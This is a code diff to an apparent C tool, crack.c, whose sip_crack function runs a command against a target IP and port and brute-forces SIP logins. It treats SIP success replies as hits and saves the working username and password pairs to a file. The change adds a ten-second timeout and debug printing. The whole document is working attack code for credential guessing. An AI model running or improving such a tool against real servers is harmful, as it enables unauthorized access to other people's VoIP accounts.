@@ -3,7 +3,6 @@ gcc crack.c -o crack -pthread
 
 =====================================
 
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <getopt.h>
@@ -125,28 +124,48 @@ void sip_crack(Target* target, UserPass* user_pass) {
 
     printf("Running command: %s\n", command);
 
-    // Open the command as a pipe and read the output
+    // Open the command as a pipe and read the output with timeout of 10 seconds
     FILE* pipe = popen(command, "r");
     if (!pipe) {
         perror("Failed to open pipe");
         return;
     }
 
-    // Read each line of the output
-    char buffer[MAX_LINE_SIZE];
-    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
-        // Check if the response contains "200 OK", "202 Accepted", or "204 No Notification"
-        if (strstr(buffer, "200 OK") || strstr(buffer, "202 Accepted") || strstr(buffer, "204 No Notification")) {
-            printf("Success: %s\n", buffer);
-            // Write the successful attempt to the success file
-            FILE* success = fopen(success_file, "a");
-            if (success) {
-                fprintf(success, "Target: %s:%d, Username: %s, Password: %s\n", target->ip, target->port, user_pass->username, user_pass->password);
-                fclose(success);
-            } else {
-                perror("Failed to write success results");
+    // Set a timer for 10 seconds
+    struct timeval timeout;
+    timeout.tv_sec = 10;
+    timeout.tv_usec = 0;
+
+    fd_set fds;
+    FD_ZERO(&fds);
+    FD_SET(fileno(pipe), &fds);
+
+    // Wait for the pipe to be ready for reading or the timeout to occur
+    int select_result = select(fileno(pipe) + 1, &fds, NULL, NULL, &timeout);
+
+    if (select_result == -1) {
+        perror("select error");
+    } else if (select_result == 0) {
+        // Timeout occurred
+        printf("Timeout occurred for target %s:%d\n", target->ip, target->port);
+    } else {
+        // Pipe is ready for reading, read the output
+        char buffer[MAX_LINE_SIZE];
+        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+            printf("Command Output: %s", buffer); // Print the output for debugging
+            // Check if the response contains "200 OK", "202 Accepted", or "204 No Notification"
+            if (strstr(buffer, "200 OK") || strstr(buffer, "202 Accepted") || strstr(buffer, "204 No Notification")) {
+                printf("Success: %s\n", buffer);
+                // Write the successful attempt to the success file
+                FILE* success = fopen(success_file, "a");
+                if (success) {
+                    fprintf(success, "Target: %s:%d, Username: %s, Password: %s\n", target->ip, target->port, user_pass->username, user_pass->password);
+                    fclose(success);
+                } else {
+                    perror("Failed to write success results");
+                }
+                break; // Break the loop if successful response is found
             }
-            break; // Break the loop if successful response is found
         }
     }
 
